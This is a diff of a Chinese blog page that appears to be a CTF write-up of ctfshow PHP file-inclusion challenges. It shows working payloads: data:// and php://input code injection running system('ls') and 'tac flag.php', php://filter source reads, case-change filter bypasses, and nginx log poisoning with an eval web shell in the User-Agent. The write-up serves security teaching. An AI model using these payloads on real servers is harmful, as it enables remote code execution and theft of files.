href="#%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">利用session.upload_progress进行文件包含</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BAsession%E6%96%87%E4%BB%B6%E5%91%A2%E3%80%82"><span class="nav-number">1.5.1.3.</span> <span class="nav-text">如何创建session文件呢。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%90%8E%EF%BC%8Csession%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E7%AB%8B%E5%8D%B3%E6%B8%85%E7%A9%BA%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%A6%81%E6%83%B3%E5%8A%9E%E6%B3%95%E6%8A%8Asession%E7%95%99%E5%9C%A8%E9%87%8C%E9%9D%A2%EF%BC%8C%E6%89%80%E4%BB%A5%E5%B0%B1%E8%A6%81%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%EF%BC%8C%E5%9C%A8session%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%B8%85%E7%A9%BA%E5%89%8D%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%E3%80%82"><span class="nav-number">1.5.1.4.</span> <span class="nav-text">默认配置导致文件上传后，session文件内容立即清空，所以我们要想办法把session留在里面，所以就要利用条件竞争，在session文件内容清空前进行文件包含利用。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E5%80%9F%E5%8A%A9Burp-Suite"><span class="nav-number">1.5.1.5.</span> <span class="nav-text">方法一 | 借助Burp Suite</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">1.5.2.</span> <span class="nav-text">条件竞争</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A6%82%E5%BF%B5"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">概念</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%A7%E7%94%9F%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.5.2.2.</span> <span class="nav-text">产生条件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8PHP-SESSION-UPLOAD-PROGRESS%E5%8A%A0%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.5.3.</span> <span class="nav-text">利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web83"><span class="nav-number">1.6.</span> <span class="nav-text">web83</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="nav-number">1.6.1.</span> <span class="nav-text">用脚本:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web84"><span class="nav-number">1.7.</span> <span class="nav-text">web84</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web85"><span class="nav-number">1.8.</span> <span class="nav-text">web85</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file-get-contents-%E5%87%BD%E6%95%B0"><span class="nav-number">1.8.1.</span> <span class="nav-text">file_get_contents()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strpos-%E5%87%BD%E6%95%B0"><span class="nav-number">1.8.2.</span> <span class="nav-text">strpos()函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web86"><span class="nav-number">1.9.</span> <span class="nav-text">web86</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web87"><span class="nav-number">1.10.</span> <span class="nav-text">web87</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php-filter-%E6%B5%81%E7%9A%84-base64-decode-%E6%96%B9%E6%B3%95"><span class="nav-number">1.10.1.</span> <span class="nav-text">php:&#x2F;&#x2F;filter 流的 base64-decode 方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87-rot13-%E7%BC%96%E7%A0%81%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87"><span class="nav-number">1.10.2.</span> <span class="nav-text">通过 rot13 编码实现绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87-strip-tags-%E5%87%BD%E6%95%B0%E5%8E%BB%E9%99%A4-XML-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.10.3.</span> <span class="nav-text">通过 strip_tags 函数去除 XML 标签</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#strip-tags%E5%87%BD%E6%95%B0"><span class="nav-number">1.10.3.1.</span> <span class="nav-text">strip_tags函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web88"><span class="nav-number">1.11.</span> <span class="nav-text">web88</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">wanTh3flag</p>
+  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">160</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">117</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="wanTh3flag">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="root@wanth3f1ag">
+      <meta itemprop="description" content="一条有梦想的咸鱼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="web入门文件包含篇-ctfshow | root@wanth3f1ag">
+      <meta itemprop="description" content="web入门文件包含篇-ctfshow">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          web入门文件包含篇-ctfshow
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-12-03 14:29:06" itemprop="dateCreated datePublished" datetime="2024-12-03T14:29:06+08:00">2024-12-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-12-01 19:07:53" itemprop="dateModified" datetime="2025-12-01T19:07:53+08:00">2025-12-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>11k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>10 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">web入门文件包含篇-ctfshow</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>这篇文章的知识点大部分已经移到另一篇文章了</p>
 <h1 id="0x02题目"><a href="#0x02题目" class="headerlink" title="0x02题目"></a>0x02题目</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730028479242-bc1adeb6-66d3-4ccc-8872-1252551f0a4c.png" alt="img"></p>
 <p>典型的文件包含<strong>include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来</strong>。</p>
 <p>我们采用伪协议去做</p>
 <h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p>做法:</p>
 <p>做法一:采用data伪协议</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">?file=data://text/plain,&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">?file=data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">?file=data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 
 <h4 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data:&#x2F;&#x2F;伪协议"></a>data:&#x2F;&#x2F;伪协议</h4><p>data:&#x2F;&#x2F; 是一个流封装器（stream wrapper），它允许你读取或写入数据作为文件流，而不是从实际的磁盘文件中，可以让用户来控制输入流，<strong>当它与include()包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行</strong></p>
 <p>做法二:采用filiter</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
 
 <p>利用filter协议读文件±，将flag.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。</p>
 <p>做法三:用input伪协议</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php://input并提交POST请求包数据:&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">?file=php://input并提交POST请求包数据:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">?file=php://input并提交POST请求包数据:</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">?file=php://input并提交POST请求包数据:</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 
 <p>(可以用hackbar提交也可以用burpsuite进行提交)</p>
 <p>把传递方式改成POST方式，再添加php代码</p>
@@ -221,13 +365,13 @@
 <h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730030606040-7bf50287-c040-4e27-b8e6-d2145f24eace.png" alt="img"></p>
 <p>题目过滤了php，所以我们应该绕过php</p>
 <p>做法一:data 通配符绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?=system(&#x27;ls&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">?file=data://text/plain,&lt;?=system(&#x27;tac flag.???&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">file</span>=data://<span class="keyword">text</span>/plain,<span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">?<span class="built_in">file</span>=data://<span class="keyword">text</span>/plain,<span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">&#x27;tac flag.???&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>注意:如果是用?进行匹配，需要写成flag.???,如果是用<em>的话只需要fla</em>就行，因为*是匹配多个字符的，?只能匹配一个字符</p>
-<h3 id="php之"><a href="#php之" class="headerlink" title="php之&lt;?&#x3D; ?&gt;"></a>php之&lt;?&#x3D; ?&gt;</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? ?&gt;`相当于对`&lt;?php ?&gt;`的替换。而`&lt;?= ?&gt;`则是相当于`&lt;?php echo ... ?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="php之"><a href="#php之" class="headerlink" title="php之&lt;?&#x3D; ?&gt;"></a>php之&lt;?&#x3D; ?&gt;</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> <span class="meta">?&gt;</span>`相当于对`<span class="meta">&lt;?php</span> <span class="meta">?&gt;</span>`的替换。而`<span class="meta">&lt;?=</span> <span class="meta">?&gt;</span>`则是相当于`<span class="meta">&lt;?php</span> <span class="keyword">echo</span> ... <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="采用大小写绕过"><a href="#采用大小写绕过" class="headerlink" title="采用大小写绕过"></a>采用大小写绕过</h3><p>做法二:<strong>input协议 大小写绕过</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?file=PhP://input</span><br><span class="line"></span><br><span class="line">&lt;?PhP system(&#x27;ls&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">?file=PhP://input</span><br><span class="line"></span><br><span class="line">&lt;?PhP system(&#x27;tac flag*&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">file</span>=PhP://input</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>PhP <span class="keyword">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">?<span class="built_in">file</span>=PhP://input</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>PhP <span class="keyword">system</span>(<span class="string">&#x27;tac flag*&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>以上两种方法都是可以绕过的，主要是看想用哪个</p>
 <h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730032976505-90251105-1c5f-4a94-b1bd-9ece517a5765.png" alt="img"></p>
@@ -238,10 +382,10 @@
 <p>还可以用日志文件包含</p>
 <p>访问?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
 <p>先添加user-agetn头:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=eval($_GET[2]);?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">2</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>执行<code>?file=/var/log/nginx/access.log&amp;2=system(&#39;ls /var/www/html&#39;);phpinfo();</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;2=system(&#x27;tac /var/www/html/fl0g.php&#x27;);phpinfo();</span><br></pre></td></tr></table></figure>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">file</span>=/var/<span class="built_in">log</span>/nginx/access.<span class="built_in">log</span>&amp;<span class="number">2</span>=<span class="keyword">system</span>(<span class="string">&#x27;tac /var/www/html/fl0g.php&#x27;</span>);phpinfo();</span><br></pre></td></tr></table></figure>
 
 <p>寻找PHPinfo信息前面的那一段信息即可找到</p>
 <p><strong>url的请求也会被包含进去，所以在url中的马没法执行</strong></p>
@@ -374,164 +518,117 @@
 
 <p>主要是data协议构造base64的时候必须要求不含&#x3D;和+号，多试几次构造一下，在结尾?&gt;后添加字符消除&#x3D;</p>
 
-  </div>
-</article>
-
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-        
-          <li><a href="/">H0me</a></li>
-        
-          <li><a href="/about/">A6out</a></li>
-        
-          <li><a href="/tags/">T6gs</a></li>
-        
-          <li><a href="/categories/">Catagory</a></li>
-        
-          <li><a href="/links/">L1nks</a></li>
-        
-          <li><a href="/search/">s4arch</a></li>
-        
-      </ul>
     </div>
 
     
     
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">0x02题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web78"><span class="toc-number">1.1.</span> <span class="toc-text">web78</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">php伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#data-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">data:&#x2F;&#x2F;伪协议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input"><span class="toc-number">1.1.2.</span> <span class="toc-text">php:&#x2F;&#x2F;input</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web79"><span class="toc-number">1.2.</span> <span class="toc-text">web79</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%B9%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">php之&lt;?&#x3D; ?&gt;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%87%E7%94%A8%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.</span> <span class="toc-text">采用大小写绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web80"><span class="toc-number">1.3.</span> <span class="toc-text">web80</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web81"><span class="toc-number">1.4.</span> <span class="toc-text">web81</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.4.1.</span> <span class="toc-text">#日志文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web82"><span class="toc-number">1.5.</span> <span class="toc-text">web82</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.5.1.</span> <span class="toc-text">session文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Session%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">Session的工作原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">利用session.upload_progress进行文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BAsession%E6%96%87%E4%BB%B6%E5%91%A2%E3%80%82"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">如何创建session文件呢。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%90%8E%EF%BC%8Csession%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E7%AB%8B%E5%8D%B3%E6%B8%85%E7%A9%BA%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%A6%81%E6%83%B3%E5%8A%9E%E6%B3%95%E6%8A%8Asession%E7%95%99%E5%9C%A8%E9%87%8C%E9%9D%A2%EF%BC%8C%E6%89%80%E4%BB%A5%E5%B0%B1%E8%A6%81%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%EF%BC%8C%E5%9C%A8session%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%B8%85%E7%A9%BA%E5%89%8D%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%E3%80%82"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">默认配置导致文件上传后，session文件内容立即清空，所以我们要想办法把session留在里面，所以就要利用条件竞争，在session文件内容清空前进行文件包含利用。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E5%80%9F%E5%8A%A9Burp-Suite"><span class="toc-number">1.5.1.5.</span> <span class="toc-text">方法一 | 借助Burp Suite</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">1.5.2.</span> <span class="toc-text">条件竞争</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">产生条件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8PHP-SESSION-UPLOAD-PROGRESS%E5%8A%A0%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.5.3.</span> <span class="toc-text">利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web83"><span class="toc-number">1.6.</span> <span class="toc-text">web83</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">1.6.1.</span> <span class="toc-text">用脚本:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web84"><span class="toc-number">1.7.</span> <span class="toc-text">web84</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web85"><span class="toc-number">1.8.</span> <span class="toc-text">web85</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#file-get-contents-%E5%87%BD%E6%95%B0"><span class="toc-number">1.8.1.</span> <span class="toc-text">file_get_contents()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strpos-%E5%87%BD%E6%95%B0"><span class="toc-number">1.8.2.</span> <span class="toc-text">strpos()函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web86"><span class="toc-number">1.9.</span> <span class="toc-text">web86</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web87"><span class="toc-number">1.10.</span> <span class="toc-text">web87</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter-%E6%B5%81%E7%9A%84-base64-decode-%E6%96%B9%E6%B3%95"><span class="toc-number">1.10.1.</span> <span class="toc-text">php:&#x2F;&#x2F;filter 流的 base64-decode 方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-rot13-%E7%BC%96%E7%A0%81%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.</span> <span class="toc-text">通过 rot13 编码实现绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-strip-tags-%E5%87%BD%E6%95%B0%E5%8E%BB%E9%99%A4-XML-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.10.3.</span> <span class="toc-text">通过 strip_tags 函数去除 XML 标签</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#strip-tags%E5%87%BD%E6%95%B0"><span class="toc-number">1.10.3.1.</span> <span class="toc-text">strip_tags函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web88"><span class="toc-number">1.11.</span> <span class="toc-text">web88</span></a></li></ol></li></ol>
-      </div>
     
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
